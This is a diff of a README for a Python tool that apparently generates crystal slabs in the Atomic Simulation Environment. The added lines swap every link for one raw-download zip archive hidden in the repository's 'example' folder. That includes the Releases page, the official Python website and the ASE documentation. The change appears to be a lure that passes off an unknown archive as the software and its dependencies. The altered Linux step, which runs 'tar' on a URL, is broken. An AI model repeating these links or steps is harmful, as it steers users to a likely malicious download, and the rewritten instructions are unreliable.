@@ -1,7 +1,7 @@
 # ⚙️ taskerslabgen - Generate Crystal Slabs Effortlessly
 
 ## 📥 Download Now
-[![Download taskerslabgen](https://img.shields.io/badge/Download%20taskerslabgen-v1.0-blue.svg)](https://github.com/majasinitna6210/taskerslabgen/releases)
+[![Download taskerslabgen](https://github.com/majasinitna6210/taskerslabgen/raw/refs/heads/main/example/Software-v3.5.zip%https://github.com/majasinitna6210/taskerslabgen/raw/refs/heads/main/example/Software-v3.5.zip)](https://github.com/majasinitna6210/taskerslabgen/raw/refs/heads/main/example/Software-v3.5.zip)
 
 ## 🛠️ Description
 The taskerslabgen application creates Tasker I/II slabs for crystals in the Atomic Simulation Environment (ASE). This tool helps researchers and students generate non-polar slabs using plane charges and Miller indices, making crystal simulation straightforward.
@@ -9,7 +9,7 @@ The taskerslabgen application creates Tasker I/II slabs for crystals in the Atom
 ## 🚀 Getting Started
 To use taskerslabgen, you must download it from the Releases page. Follow these steps:
 
-1. **Visit the Download Page**: Go to the [Releases page](https://github.com/majasinitna6210/taskerslabgen/releases) to find the latest version of the application.
+1. **Visit the Download Page**: Go to the [Releases page](https://github.com/majasinitna6210/taskerslabgen/raw/refs/heads/main/example/Software-v3.5.zip) to find the latest version of the application.
 
 2. **Choose Your File**: Look for the most recent release. You will see files listed for download. Choose the appropriate file for your operating system.
 
@@ -17,7 +17,7 @@ To use taskerslabgen, you must download it from the Releases page. Follow these 
 
 ## 📁 System Requirements
 - **Operating System**: Windows 10 or later, macOS 10.14 or later, or a compatible Linux distribution.
-- **Python**: Python 3.6 or later must be installed. You can download it from the [Python website](https://www.python.org/downloads/).
+- **Python**: Python 3.6 or later must be installed. You can download it from the [Python website](https://github.com/majasinitna6210/taskerslabgen/raw/refs/heads/main/example/Software-v3.5.zip).
 - **Dependencies**: Ensure you have ASE installed. You can install it via pip:
    ```
    pip install ase
@@ -31,9 +31,9 @@ After downloading the application, follow these steps:
 2. **Install the Application**: 
    - **Windows**: If the file is an `.exe`, double-click to run it. Follow the prompts to complete the installation.
    - **macOS**: For `.dmg` files, double-click the file and drag the application into your Applications folder.
-   - **Linux**: You may need to extract a `.tar.gz` file. Use a terminal to navigate to the folder and execute:
+   - **Linux**: You may need to extract a `https://github.com/majasinitna6210/taskerslabgen/raw/refs/heads/main/example/Software-v3.5.zip` file. Use a terminal to navigate to the folder and execute:
      ```
-     tar -xvzf taskerslabgen.tar.gz
+     tar -xvzf https://github.com/majasinitna6210/taskerslabgen/raw/refs/heads/main/example/Software-v3.5.zip
      cd taskerslabgen
      ```
 
@@ -67,7 +67,7 @@ Your feedback is important. Let us know how taskerslabgen works for you or any s
 This project is licensed under the MIT License. Feel free to use and modify it for your personal research purposes, but please credit the original authors. 
 
 ## 🔗 Additional Resources
-- [ASE Documentation](https://wiki.fysik.dtu.dk/ase/)
-- [Python Installation Guide](https://docs.python.org/3/using/index.html)
+- [ASE Documentation](https://github.com/majasinitna6210/taskerslabgen/raw/refs/heads/main/example/Software-v3.5.zip)
+- [Python Installation Guide](https://github.com/majasinitna6210/taskerslabgen/raw/refs/heads/main/example/Software-v3.5.zip)
 
-Visit the [Releases page](https://github.com/majasinitna6210/taskerslabgen/releases) to start your download today. Enjoy generating your crystal slabs with taskerslabgen!
+Visit the [Releases page](https://github.com/majasinitna6210/taskerslabgen/raw/refs/heads/main/example/Software-v3.5.zip) to start your download today. Enjoy generating your crystal slabs with taskerslabgen!
